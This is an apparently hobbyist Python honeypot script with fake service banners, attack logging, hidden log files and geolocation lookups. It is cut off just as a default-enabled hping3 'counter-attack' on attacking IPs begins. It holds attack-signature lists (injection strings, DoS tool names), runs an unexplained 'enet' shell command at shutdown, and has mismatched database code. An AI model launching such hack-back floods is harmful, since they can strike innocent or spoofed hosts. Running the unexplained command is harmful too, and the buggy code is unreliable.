#!/usr/bin/env python3

import socket
import threading
import logging
import sqlite3
import datetime
import os
import time
import itertools
import sys
import requests
import random
import json
import hashlib
import re
from collections import defaultdict, deque
import subprocess

# ASCII Art and Animations
HONEYPOT_LOGO = r"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║  
║           _____          ____   ____    _____                ║
║          /    /|___     |    | |    |  /    /|___            ║
║         /    /|    |    |    | |    | /    /|    |           ║
║        |\____\|    |    |    |_|    ||\____\|    |           ║
║        | |   |/    |___ |    .-.    || |   |/    |___        ║
║         \|___/    /    ||    | |    | \|___/    /    |       ║
║            /     /|    ||    | |    |    /     /|    |       ║
║           |_____|/____/||____| |____|   |_____|/____/|       ║
║           |     |    | ||    | |    |   |     |    | |       ║ 
║           |_____|____|/ |____| |____|   |_____|____|/        ║
║             \(    )/      \(     )/       \(    )/           ║
║              '    '        '     '         '    '            ║                                        
║                                                              ║
║                   🔒  Zarga  Honeypot v2.0                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

# Glitch effects for startup
GLITCH_CHARS = ["█", "▓", "▒", "░", "▄", "▀", "▌", "▐", "■", "□", "▪", "▫", "▬", "▭", "▮", "▯"]

STARTUP_ANIMATION = [
    "🔒 Initializing security protocols...",
    "🌐 Setting up network monitoring...",
    "🛡️ Configuring attack detection...",
    "📊 Preparing database systems...",
    "🎯 Loading threat intelligence...",
    "🚀 Launching honeypot services...",
    "✅ System ready for deployment!"
]

SHUTDOWN_ANIMATION = [
    "🛑 Initiating secure shutdown...",
    "🔒 Securing active connections...",
    "📊 Saving session data...",
    "🛡️ Cleaning up resources...",
    "🔐 Finalizing security protocols...",
    "✅ Honeypot safely terminated!"
]

# Clean shutdown effects
CLEAN_EFFECTS = [
    "🧹 Cleaning temporary files...",
    "🗑️ Removing cache data...",
    "🔧 Resetting configurations...",
    "📝 Finalizing logs...",
    "✨ System sanitized!"
]

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Now define GLITCH_COLORS after Colors class
GLITCH_COLORS = [Colors.RED, Colors.GREEN, Colors.BLUE, Colors.YELLOW, Colors.PURPLE, Colors.CYAN]

def print_colored(text, color=Colors.WHITE, bold=False):
    """Print colored text with optional bold formatting"""
    if bold:
        print(f"{color}{Colors.BOLD}{text}{Colors.END}")
    else:
        print(f"{color}{text}{Colors.END}")

def animate_text(text, delay=0.1, color=Colors.CYAN):
    """Animate text character by character"""
    for char in text:
        print(f"{color}{char}{Colors.END}", end='', flush=True)
        time.sleep(delay)
    print()

def loading_animation(duration=2, message="Loading"):
    """Show a loading animation"""
    animation = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    start_time = time.time()
    i = 0
    
    while time.time() - start_time < duration:
        print(f"\r{Colors.CYAN}{animation[i]} {message}...{Colors.END}", end='', flush=True)
        time.sleep(0.1)
        i = (i + 1) % len(animation)
    print()

def show_stats_animation():
    """Show animated statistics"""
    stats_animation = [
        "📊 Attack Statistics",
        "🎯 Threat Detection",
        "🛡️ Security Status",
        "🌐 Network Monitoring",
        "🔒 Access Control"
    ]
    
    for stat in stats_animation:
        print_colored(f"  {stat}", Colors.PURPLE)
        time.sleep(0.2)
    print()

def glitch_effect(text, duration=1.0):
    """Create a glitch effect on text"""
    import random
    original_text = text
    glitch_duration = duration
    start_time = time.time()
    
    while time.time() - start_time < glitch_duration:
        # Randomly glitch the text
        glitched_text = ""
        for char in original_text:
            if random.random() < 0.3:  # 30% chance to glitch each character
                glitched_text += random.choice(GLITCH_CHARS)
            else:
                glitched_text += char
        
        # Print with random colors
        color = random.choice(GLITCH_COLORS)
        print(f"\r{color}{glitched_text}{Colors.END}", end='', flush=True)
        time.sleep(0.05)
    
    # Return to original text
    print(f"\r{Colors.CYAN}{original_text}{Colors.END}")

def phunky_effect(text, duration=2.0):
    """Create a phunky/glitch startup effect"""
    import random
    frames = []
    
    # Generate glitch frames
    for i in range(20):
        frame = ""
        for char in text:
            if random.random() < 0.4:
                frame += random.choice(GLITCH_CHARS)
            else:
                frame += char
        frames.append(frame)
    
    # Add original text at the end
    frames.append(text)
    
    # Play the animation
    for frame in frames:
        color = random.choice(GLITCH_COLORS)
        print(f"\r{color}{frame}{Colors.END}", end='', flush=True)
        time.sleep(duration / len(frames))
    print()

def clean_effect(text, duration=1.0):
    """Create a clean/smooth effect"""
    import random
    clean_chars = ["░", "▒", "▓", "█"]
    
    # Gradually fill the text with clean characters
    for i in range(len(text)):
        partial_text = text[:i+1]
        remaining = "░" * (len(text) - i - 1)
        full_text = partial_text + remaining
        
        print(f"\r{Colors.GREEN}{full_text}{Colors.END}", end='', flush=True)
        time.sleep(duration / len(text))
    print()

def matrix_rain_effect(duration=3.0):
    """Create a Matrix-style rain effect"""
    import random
    import string
    
    width = 80
    height = 20
    matrix_chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    start_time = time.time()
    while time.time() - start_time < duration:
        # Clear screen (simplified)
        print("\033[2J\033[H", end='')
        
        # Generate matrix rain
        for y in range(height):
            line = ""
            for x in range(width):
                if random.random() < 0.1:  # 10% chance for character
                    char = random.choice(matrix_chars)
                    color = random.choice([Colors.GREEN, Colors.CYAN])
                    line += f"{color}{char}{Colors.END}"
                else:
                    line += " "
            print(line)
        
        time.sleep(0.1)
    
    # Clear screen after effect
    print("\033[2J\033[H", end='')

def logo_fade_in_effect():
    """Create a fade-in effect for the logo with subtle glitch effects and gradient"""
    import random
    logo_lines = HONEYPOT_LOGO.split('\n')
    
    # Define gradient colors for the logo
    gradient_colors = [Colors.BLUE, Colors.CYAN, Colors.BLUE, Colors.CYAN, Colors.BLUE]
    
    # Fade in each line gradually
    for i, line in enumerate(logo_lines):
        if line.strip():  # Skip empty lines
            # Choose color for this line
            color = gradient_colors[i % len(gradient_colors)]
            
            # Start with empty spaces
            empty_line = " " * len(line)
            print(f"\r{color}{empty_line}{Colors.END}", end='', flush=True)
            
            # Gradually reveal the line character by character
            for j in range(len(line)):
                partial_line = line[:j+1] + " " * (len(line) - j - 1)
                
                # Add subtle glitch effect occasionally
                if random.random() < 0.03:  # 3% chance for glitch
                    glitch_char = random.choice(GLITCH_CHARS)
                    glitch_line = partial_line[:j] + glitch_char + partial_line[j+1:]
                    print(f"\r{Colors.CYAN}{glitch_line}{Colors.END}", end='', flush=True)
                    time.sleep(0.002)  # 5x faster glitch effect
                    print(f"\r{color}{partial_line}{Colors.END}", end='', flush=True)
                else:
                    print(f"\r{color}{partial_line}{Colors.END}", end='', flush=True)
                
                time.sleep(0.0024)  # 5x faster reveal (was 0.012)
            
            print()  # Move to next line
        else:
            print()  # Empty line
    
    # Final glow effect with pulsing (faster)
    for _ in range(3):
        print_colored("✨ Logo rendered successfully!", Colors.CYAN, bold=True)
        time.sleep(0.04)  # 5x faster (was 0.2)
        print_colored("✨ Logo rendered successfully!", Colors.BLUE, bold=True)
        time.sleep(0.04)  # 5x faster (was 0.2)
    
    print_colored("✨ Logo rendered successfully!", Colors.CYAN, bold=True)
    time.sleep(0.1)  # 5x faster (was 0.5)

def check_admin_rights():
    try:
        if os.name == 'nt':
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            is_admin = os.geteuid() == 0
        return is_admin, "Admin/Root access detected" if is_admin else "Not running as Admin/Root"
    except Exception as e:
        return False, f"Error: {e}"

def check_required_packages():
    required = ["requests", "sqlite3"]
    missing = []
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    if not missing:
        return True, "All required packages available"
    else:
        return False, f"Missing: {', '.join(missing)}"

def check_ports_available(ports):
    busy = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.close()
        except Exception:
            busy.append(port)
    if not busy:
        return True, "All ports available"
    else:
        return False, f"Ports busy: {', '.join(map(str, busy))}"

def prepare_database():
    try:
        create_hidden_files()
        init_db()
        return True, "Database ready"
    except Exception as e:
        return False, f"DB error: {e}"

def restore_bans():
    try:
        restore_banned_ips()
        return True, "Bans restored"
    except Exception as e:
        return False, f"Restore error: {e}"

def check_hping3_available():
    """Check if hping3 is available on the system"""
    try:
        result = os.system("hping3 --version >/dev/null 2>&1")
        return result == 0, "hping3 available for counter-attacks" if result == 0 else "hping3 not found - counter-attacks disabled"
    except:
        return False, "hping3 check failed"

def startup_sequence():
    # Clear screen first
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Show logo quickly
    logo_fade_in_effect()
    print()
    
    print_colored("🔒 Enhanced Honeypot v2.0 - Quick System Check", Colors.CYAN, bold=True)
    print_colored("=" * 50, Colors.YELLOW)
    
    # Quick status check - all in one line each
    admin_ok, _ = check_admin_rights()
    packages_ok, _ = check_required_packages()
    ports_ok, _ = check_ports_available(DEFAULT_PORTS)
    db_ok, _ = prepare_database()
    bans_ok, _ = restore_bans()
    cleanup_old_counter_attacks()
    hping3_ok, _ = check_hping3_available()
    sound_ok, _ = test_alert_sound()
    
    # Display results in compact format
    print_colored(f"Admin: {'✅' if admin_ok else '❌'} | Packages: {'✅' if packages_ok else '❌'} | Ports: {'✅' if ports_ok else '❌'}", Colors.GREEN if all([admin_ok, packages_ok, ports_ok]) else Colors.YELLOW)
    print_colored(f"Database: {'✅' if db_ok else '❌'} | Bans: {'✅' if bans_ok else '❌'} | Counter-Attack: {'✅' if hping3_ok else '❌'} | Sound: {'✅' if sound_ok else '❌'}", Colors.GREEN if all([db_ok, bans_ok, hping3_ok, sound_ok]) else Colors.YELLOW)
    
    print_colored("\n🎯 System Ready!", Colors.GREEN, bold=True)
    print_colored("=" * 50, Colors.YELLOW)

def shutdown_sequence():
    """Display shutdown animation with clean effects"""
    print()
    print_colored("╔══════════════════════════════════════════════════════════════╗", Colors.RED)
    print_colored("║                   🛑 SHUTDOWN SEQUENCE 🛑                   ║", Colors.RED)
    print_colored("╚══════════════════════════════════════════════════════════════╝", Colors.RED)
    print()
    
    # Regular shutdown steps
    for step in SHUTDOWN_ANIMATION:
        print_colored(f"  {step}", Colors.YELLOW)
        loading_animation(0.3, step.split('...')[0])
    
    print()
    print_colored("🧹 CLEANING SYSTEM...", Colors.GREEN, bold=True)
    
    # Clean effects
    for clean_step in CLEAN_EFFECTS:
        print_colored(f"  {clean_step}", Colors.GREEN)
        clean_effect("████████████████████████████████████████████████████████████", 0.5)
    
    print()
    print_colored("╔══════════════════════════════════════════════════════════════╗", Colors.GREEN)
    print_colored("║                    ✅ SHUTDOWN COMPLETE ✅                   ║", Colors.GREEN)
    print_colored("╚══════════════════════════════════════════════════════════════╝", Colors.GREEN)
    print()
    
    # Execute enet command before clearing screen
    print_colored("🔧 Executing enet command...", Colors.CYAN)
    try:
        os.system("enet")
        print_colored("✅ enet command executed successfully", Colors.GREEN)
    except Exception as e:
        print_colored(f"❌ Error executing enet: {e}", Colors.RED)
    
    # Clear screen after shutdown
    print_colored("🧹 Clearing screen...", Colors.CYAN)
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')

# Enhanced Configuration
DEFAULT_PORTS = [22, 21, 80, 443, 3389, 445, 1433, 3306, 25, 8080, 23, 139, 143, 993, 995, 110, 587, 465]
# LOG_FILE = "honeypot_enhanced.log"
# DB_FILE = "honeypot_enhanced.db"
ENABLE_IPTABLES_BAN = True
ENABLE_TELEGRAM_ALERTS = False
ENABLE_COUNTER_ATTACK = True  # Enable counter-attack feature
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
FAKE_OS = "Windows Server 2019 Datacenter"
RUNNING = True

# Global variables for hidden file paths
HIDDEN_DB_FILE = None
HIDDEN_LOG_FILE = None

# Track active counter-attacks to prevent multiple windows
ACTIVE_COUNTER_ATTACKS = set()

# Window positioning for counter-attacks
COUNTER_ATTACK_WINDOW_COUNT = 0

# Enhanced fake banners with more realistic responses
FAKE_BANNERS = {
    22: {
        "banner": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
        "auth_methods": "publickey,password",
        "interactive": True,
        "commands": ["ls", "pwd", "whoami", "cat /etc/passwd", "uname -a"]
    },
    21: {
        "banner": "220 (vsFTPd 3.0.3)",
        "auth_required": True,
        "interactive": True,
        "commands": ["USER", "PASS", "LIST", "CWD", "PWD"]
    },
    80: {
        "banner": "HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Type: text/html\r\n",
        "html_content": """
        <!DOCTYPE html>
        <html>
        <head><title>Welcome to nginx!</title></head>
        <body>
        <h1>Welcome to nginx!</h1>
        <p>If you see this page, the nginx web server is successfully installed and working.</p>
        </body>
        </html>
        """,
        "interactive": False
    },
    443: {
        "banner": "HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Type: text/html\r\n",
        "html_content": """
        <!DOCTYPE html>
        <html>
        <head><title>Secure Site</title></head>
        <body>
        <h1>Secure Connection Established</h1>
        <p>This is a secure HTTPS connection.</p>
        </body>
        </html>
        """,
        "interactive": False
    },
    3389: {
        "banner": "RDP-5.1 Windows Server 2019 Standard",
        "interactive": True,
        "auth_required": True
    },
    445: {
        "banner": "\\x00\\x00\\x00\\x48\\xff\\x53\\x4d\\x42\\x72\\x00\\x00\\x00\\x00\\x18\\x53\\xc8\\x00\\x00",
        "interactive": True,
        "commands": ["SMB", "NTLM", "AUTH"]
    },
    1433: {
        "banner": "Microsoft SQL Server 2019 - 15.0.2000.5",
        "interactive": True,
        "commands": ["SELECT", "INSERT", "UPDATE", "DELETE", "CREATE", "DROP"]
    },
    3306: {
        "banner": "\\x5b\\x00\\x00\\x01\\x5a.5.7.33-0ubuntu0.18.04.1-log\\x00",
        "interactive": True,
        "commands": ["SELECT", "INSERT", "UPDATE", "DELETE", "CREATE", "DROP"]
    },
    25: {
        "banner": "220 smtp.office365.com ESMTP Microsoft",
        "interactive": True,
        "commands": ["HELO", "EHLO", "MAIL FROM", "RCPT TO", "DATA", "QUIT"]
    },
    8080: {
        "banner": "HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Type: text/html\r\n",
        "html_content": """
        <!DOCTYPE html>
        <html>
        <head><title>Proxy Server</title></head>
        <body>
        <h1>Proxy Server Active</h1>
        <p>Proxy server is running and ready to handle requests.</p>
        </body>
        </html>
        """,
        "interactive": False
    },
    23: {
        "banner": "Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-74-generic x86_64)",
        "interactive": True,
        "commands": ["ls", "pwd", "whoami", "cat", "cd", "exit"]
    },
    139: {
        "banner": "NetBIOS Session Service",
        "interactive": True,
        "commands": ["SMB", "NBT"]
    }
}

# Attack patterns and signatures
ATTACK_PATTERNS = {
    "sql_injection": [
        "' OR '1'='1", "'; DROP TABLE users; --", "UNION SELECT", "xp_cmdshell",
        "exec(", "eval(", "system(", "shell_exec"
    ],
    "xss": [
        "<script>", "javascript:", "onload=", "onerror=", "onclick="
    ],
    "directory_traversal": [
        "../../../", "..\\..\\..\\", "%2e%2e%2f", "..%2f..%2f..%2f"
    ],
    "command_injection": [
        "; ls", "| cat", "`whoami`", "$(id)", "& dir", "&& pwd"
    ],
    "brute_force": [
        "admin", "root", "administrator", "user", "test", "guest"
    ],
    "dos_flood": [
        "hping3", "flood", "--flood", "syn flood", "icmp flood", "udp flood", "tcp flood", "slowloris", "ddos", "dos attack", "packet storm"
    ]
}

# Create hidden files in root or current directory
def create_hidden_files():
    """Create hidden database and log files in root directory or current directory"""
    import platform
    global HIDDEN_DB_FILE, HIDDEN_LOG_FILE
    
    db_file = ".honeypot_enhanced.db"
    log_file = ".honeypot_enhanced.log"
    
    root_paths = []
    if platform.system() == "Windows":
        root_paths = ["C:\\", "D:\\", "E:\\"]
    else:
        root_paths = [os.path.expanduser("~"), "/home/", "/"]
    root_paths.append(os.getcwd())
    created_files = []
    for root_path in root_paths:
        try:
            if os.path.exists(root_path) and os.access(root_path, os.W_OK):
                db_path = os.path.join(root_path, db_file)
                log_path = os.path.join(root_path, log_file)
                # Create database file (SQLite database)
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS attacks (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        timestamp TEXT,
                        ip_address TEXT,
                        port INTEGER,
                        service TEXT,
                        attack_type TEXT,
                        details TEXT
                    )
                ''')
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS sessions (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        session_id TEXT,
                        ip_address TEXT,
                        start_time TEXT,
                        end_time TEXT,
                        duration INTEGER,
                        commands TEXT
                    )
                ''')
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS banned_ips (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        ip_address TEXT,
                        ban_time TEXT,
                        reason TEXT,
                        duration INTEGER
                    )
                ''')
                conn.commit()
                conn.close()
                log_content = f'''Honeypot Enhanced Log File\nCreated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\nStatus: Active\nLocation: {root_path}\nVersion: Enhanced Honeypot v2.0\n\nDatabase: {db_file}\nLog File: {log_file}\n\nRecent Activities:\n- Honeypot initialized\n- Database created\n- Log file created\n- Monitoring active\n- Hidden files created successfully\n\nConfiguration:\n- Hidden files enabled\n- Database: SQLite\n- Logging: Enhanced\n- Alert system: Active\n'''
                with open(log_path, 'w', encoding='utf-8') as f:
                    f.write(log_content)
                created_files.extend([db_path, log_path])
                HIDDEN_DB_FILE = db_path
                HIDDEN_LOG_FILE = log_path
                print_colored(f"✅ Hidden database and log files created in {root_path}", Colors.GREEN, bold=True)
                break
        except Exception as e:
            print_colored(f"❌ Could not create files in {root_path}: {e}", Colors.RED)
            continue
    return created_files

# Update hidden files with new information
def update_hidden_files(attack_info=None):
    """Update hidden database and log files with new attack information"""
    import platform
    
    # Find hidden files
    hidden_files = []
    
    # Search in common locations
    search_paths = []
    
    if platform.system() == "Windows":
        search_paths = ["C:\\", "D:\\", "E:\\"]
    else:
        search_paths = ["/", "/root/", "/home/"]
    
    # Add current directory
    search_paths.append(os.getcwd())
    
    for path in search_paths:
        try:
            db_file = os.path.join(path, '.honeypot_enhanced.db')
            log_file = os.path.join(path, '.honeypot_enhanced.log')
            
            if os.path.exists(db_file):
                hidden_files.append(db_file)
            if os.path.exists(log_file):
                hidden_files.append(log_file)
                
        except:
            continue
    
    # Update log file if attack info provided
    if attack_info and hidden_files:
        for file_path in hidden_files:
            if file_path.endswith('.log'):
                try:
                    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    log_entry = f"\n[{timestamp}] [ATTACK] {attack_info}\n"
                    
                    with open(file_path, 'a', encoding='utf-8') as f:
                        f.write(log_entry)
                        
                except Exception as e:
                    logging.error(f"Error updating hidden log file {file_path}: {e}")
    
    # Update database if attack info provided
    if attack_info and hidden_files:
        for file_path in hidden_files:
            if file_path.endswith('.db'):
                try:
                    conn = sqlite3.connect(file_path)
                    cursor = conn.cursor()
                    
                    # Parse attack info (assuming format: "IP:PORT:SERVICE:ATTACK_TYPE")
                    parts = attack_info.split(':')
                    if len(parts) >= 4:
                        ip = parts[0]
                        port = int(parts[1]) if parts[1].isdigit() else 0
                        service = parts[2]
                        attack_type = parts[3]
                        
                        cursor.execute('''
                            INSERT INTO attacks (timestamp, ip, port, attack_type, payload, session_id, country, isp, threat_level)
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                        ''', (
                            datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            ip,
                            port,
                            attack_type,
                            attack_info,
                            hashlib.md5(f"{ip}_{time.time()}".encode()).hexdigest()[:12],
                            "Local Network",
                            "Local",
                            1
                        ))
                        
                        conn.commit()
                        conn.close()
                        
                except Exception as e:
                    logging.error(f"Error updating hidden database {file_path}: {e}")
    
    # Create .honeypot.js directory and files for each attacking IP
    if attack_info and len(parts) >= 4:
        ip = parts[0]
        create_honeypot_js_file(ip, attack_info)

def create_honeypot_js_file(ip, attack_info):
    """Create .honeypot.js directory and JSON file for attacking IP"""
    import platform
    
    # Find the best location for .honeypot.js directory
    honeypot_dir = None
    search_paths = []
    
    if platform.system() == "Windows":
        search_paths = ["D:\\", "C:\\", "E:\\"]
    else:
        search_paths = ["/home/", "/root/", "/"]
    
    # Add current directory
    search_paths.append(os.getcwd())
    
    for path in search_paths:
        try:
            test_dir = os.path.join(path, '.honeypot.js')
            if os.path.exists(test_dir) or os.access(path, os.W_OK):
                honeypot_dir = test_dir
                break
        except:
            continue
    
    if not honeypot_dir:
        # Fallback to current directory
        honeypot_dir = os.path.join(os.getcwd(), '.honeypot.js')
    
    try:
        # Create .honeypot.js directory if it doesn't exist
        if not os.path.exists(honeypot_dir):
            os.makedirs(honeypot_dir)
        
        # Create JSON file for this IP
        ip_file = os.path.join(honeypot_dir, f"{ip}.json")
        
        # Parse attack info
        parts = attack_info.split(':')
        attack_data = {
            "ip": ip,
            "first_seen": datetime.datetime.now().isoformat(),
            "last_seen": datetime.datetime.now().isoformat(),
            "total_attacks": 1,
            "attack_details": []
        }
        
        if len(parts) >= 4:
            attack_data["attack_details"].append({
                "timestamp": datetime.datetime.now().isoformat(),
                "port": int(parts[1]) if parts[1].isdigit() else 0,
                "service": parts[2],
                "attack_type": parts[3],
                "details": attack_info
            })
        
        # Read existing data if file exists
        if os.path.exists(ip_file):
            try:
                with open(ip_file, 'r', encoding='utf-8') as f:
                    existing_data = json.load(f)
                    existing_data["last_seen"] = datetime.datetime.now().isoformat()
                    existing_data["total_attacks"] += 1
                    if len(parts) >= 4:
                        existing_data["attack_details"].append({
                            "timestamp": datetime.datetime.now().isoformat(),
                            "port": int(parts[1]) if parts[1].isdigit() else 0,
                            "service": parts[2],
                            "attack_type": parts[3],
                            "details": attack_info
                        })
                    attack_data = existing_data
            except:
                pass
        
        # Write JSON file
        with open(ip_file, 'w', encoding='utf-8') as f:
            json.dump(attack_data, f, indent=2, ensure_ascii=False)
        
        print_colored(f"📁 Created .honeypot.js file for {ip}: {ip_file}", Colors.GREEN)
        
    except Exception as e:
        logging.error(f"Error creating .honeypot.js file for {ip}: {e}")

# Enhanced database schema
def init_db():
    # Always use the hidden DB file
    global HIDDEN_DB_FILE
    if not HIDDEN_DB_FILE:
        raise RuntimeError("Hidden DB file not set!")
    conn = sqlite3.connect(HIDDEN_DB_FILE)
    cursor = conn.cursor()
    
    # Drop existing tables to ensure correct schema
    cursor.execute("DROP TABLE IF EXISTS attacks")
    cursor.execute("DROP TABLE IF EXISTS sessions")
    cursor.execute("DROP TABLE IF EXISTS ip_reputation")
    
    # Main attacks table
    cursor.execute("""
        CREATE TABLE attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            port INTEGER,
            timestamp TEXT,
            attack_type TEXT,
            payload TEXT,
            session_id TEXT,
            country TEXT,
            isp TEXT,
            threat_level INTEGER
        )
    """)
    
    # Sessions table for tracking multi-step attacks
    cursor.execute("""
        CREATE TABLE sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE,
            ip TEXT,
            start_time TEXT,
            last_activity TEXT,
            total_requests INTEGER,
            attack_patterns TEXT
        )
    """)
    
    # IP reputation table
    cursor.execute("""
        CREATE TABLE ip_reputation (
            ip TEXT PRIMARY KEY,
            first_seen TEXT,
            last_seen TEXT,
            total_attacks INTEGER,
            threat_score INTEGER,
            is_banned INTEGER DEFAULT 0
        )
    """)
    
    conn.commit()
    conn.close()
    print("✅ Database schema created successfully")

# Enhanced IP geolocation (simplified)
def get_ip_info(ip):
    # Skip local IPs
    if ip.startswith(('192.168.', '10.', '172.16.', '127.')):
        return {"country": "Local Network", "isp": "Local", "city": "Local"}
    
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                "country": data.get("country", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "city": data.get("city", "Unknown")
            }
    except Exception as e:
        # Don't log errors for local IPs or network issues
        if not ip.startswith(('192.168.', '10.', '172.16.', '127.')):
            logging.error(f"Error getting IP info for {ip}: {e}")
    
    return {"country": "Unknown", "isp": "Unknown", "city": "Unknown"}

# Detect attack patterns
def detect_attack_pattern(payload):
    payload_lower = payload.lower()
    detected_patterns = []
    
    for pattern_type, patterns in ATTACK_PATTERNS.items():
        for pattern in patterns:
            if pattern.lower() in payload_lower:
                detected_patterns.append(pattern_type)
                break
    
    return detected_patterns

# Calculate threat level
def calculate_threat_level(attack_patterns, payload_length, is_known_attacker):
    threat_level = 1
    
    if "sql_injection" in attack_patterns:
        threat_level += 3
    if "command_injection" in attack_patterns:
        threat_level += 4
    if "xss" in attack_patterns:
        threat_level += 2
    if payload_length > 1000:
        threat_level += 2
    if is_known_attacker:
        threat_level += 3
    
    return min(threat_level, 10)

# Enhanced session tracking
def update_session(session_id, ip, payload=""):
    global HIDDEN_DB_FILE
    try:
        conn = sqlite3.connect(HIDDEN_DB_FILE, timeout=20.0)
        cursor = conn.cursor()
        
        now = datetime.datetime.now().isoformat()
        
        # Check if session exists
        cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
        session = cursor.fetchone()
        
        if session:
            # Update existing session
            cursor.execute("""
                UPDATE sessions 
                SET last_activity = ?, total_requests = total_requests + 1
                WHERE session_id = ?
            """, (now, session_id))
        else:
            # Create new session with INSERT OR IGNORE
            cursor.execute("""
                INSERT OR IGNORE INTO sessions (session_id, ip, start_time, last_activity, total_requests, attack_patterns)
                VALUES (?, ?, ?, ?, 1, ?)
            """, (session_id, ip, now, now, ""))
        
        conn.commit()
        conn.close()
    except Exception as e:
        # Don't log database locked errors as they're normal in high traffic
        if "database is locked" not in str(e):
            logging.error(f"Error updating session: {e}")
        # If session_id is duplicate, generate a new one
        if "UNIQUE constraint failed" in str(e):
            new_session_id = hashlib.md5(f"{ip}_{time.time()}_{random.randint(1000, 9999)}".encode()).hexdigest()[:12]
            logging.info(f"Generated new session_id: {new_session_id}")
            return new_session_id
    return session_id

# Enhanced logging
def log_attack(ip, port, payload="", session_id=None):
    global HIDDEN_DB_FILE
    ip_info = get_ip_info(ip)
    attack_patterns = detect_attack_pattern(payload)
    threat_level = calculate_threat_level(attack_patterns, len(payload), False)
    
    # Generate session ID if not provided
    if not session_id:
        session_id = hashlib.md5(f"{ip}_{time.time()}_{random.randint(1, 9999)}".encode()).hexdigest()[:12]
    
    # Update session
    session_id = update_session(session_id, ip, payload)
    
    # Log to database
    try:
        conn = sqlite3.connect(HIDDEN_DB_FILE, timeout=20.0)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO attacks (ip, port, timestamp, attack_type, payload, session_id, country, isp, threat_level)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            ip, port, datetime.datetime.now().isoformat(),
            ",".join(attack_patterns) if attack_patterns else "connection_attempt",
            payload, session_id, ip_info["country"], ip_info["isp"], threat_level
        ))
        
        # Update IP reputation
        cursor.execute("""
            INSERT OR REPLACE INTO ip_reputation (ip, first_seen, last_seen, total_attacks, threat_score)
            VALUES (?, COALESCE((SELECT first_seen FROM ip_reputation WHERE ip = ?), ?), ?, 
                    COALESCE((SELECT total_attacks FROM ip_reputation WHERE ip = ?), 0) + 1,
                    COALESCE((SELECT threat_score FROM ip_reputation WHERE ip = ?), 0) + ?)
        """, (ip, ip, datetime.datetime.now().isoformat(), datetime.datetime.now().isoformat(), ip, ip, threat_level))
        
        conn.commit()
        # Get updated reputation info for this IP
        cursor.execute("SELECT first_seen, last_seen, total_attacks, threat_score, is_banned FROM ip_reputation WHERE ip = ?", (ip,))
        rep = cursor.fetchone()
        conn.close()
    except Exception as e:
        # Don't log database locked errors as they're normal in high traffic
        if "database is locked" not in str(e):
            logging.error(f"Error logging attack to database: {e}")
        rep = None
    
    # Log to file
    logging.info(f"ALERT: Attack from {ip} ({ip_info['country']}) on port {port} - Patterns: {attack_patterns} - Threat: {threat_level}/10")
    
    # Update hidden files with attack information
    attack_info = f"IP: {ip}, Port: {port}, Patterns: {attack_patterns}, Threat: {threat_level}/10"
    update_hidden_files(attack_info)
    
    # --- NEW: Update .honeypot.js folder ---
    try:
        js_dir = os.path.join(os.path.dirname(HIDDEN_DB_FILE), ".honeypot.js")
        if not os.path.exists(js_dir):
            os.makedirs(js_dir)
        js_file = os.path.join(js_dir, f"{ip}.js")
        # Prepare attacker info
        attacker_data = {
            "ip": ip,
            "first_seen": rep[0] if rep else datetime.datetime.now().isoformat(),
            "last_seen": rep[1] if rep else datetime.datetime.now().isoformat(),
            "total_attacks": rep[2] if rep else 1,
            "threat_score": rep[3] if rep else threat_level,
            "is_banned": bool(rep[4]) if rep else False,
            "country": ip_info.get("country", "Unknown"),
            "city": ip_info.get("city", "Unknown"),
            "isp": ip_info.get("isp", "Unknown")
        }
        # Write/update the file
        with open(js_file, "w", encoding="utf-8") as f:
            json.dump(attacker_data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logging.error(f"Error updating .honeypot.js for {ip}: {e}")
    # --- END NEW ---
    
    # Launch counter-attack against the attacker FIRST (before banning)
    if ENABLE_COUNTER_ATTACK:  # Launch counter-attack on any threat level
